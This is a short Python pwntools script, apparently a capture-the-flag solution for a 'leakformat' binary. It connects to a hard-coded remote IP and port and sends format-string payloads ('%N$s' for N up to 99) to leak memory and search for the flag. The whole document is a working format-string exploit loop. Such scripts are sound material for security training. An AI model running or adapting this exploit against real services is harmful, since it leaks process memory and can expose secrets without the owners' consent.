from pwn import *

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF('./leakformat', checksec=False)
exe = "./leakformat"

# Let's fuzz 100 values
for i in range(100):
    try:
        # p = process(exe) # local
        p = remote('164.90.204.1', 9333) # remote
        # e.g. %2$s will attempt to print second pointer as string
        p.sendline('%{}$s'.format(i).encode())
        # Receive the response
        p.recvuntil(b'Result : ')
        result = p.recvline()
        # Check for flag
        # if("DEFENSYS" in str(result).lower()):
        print(str(i) + ': ' + str(result))
        # Exit the process
        p.close()
    except EOFError:
        pass
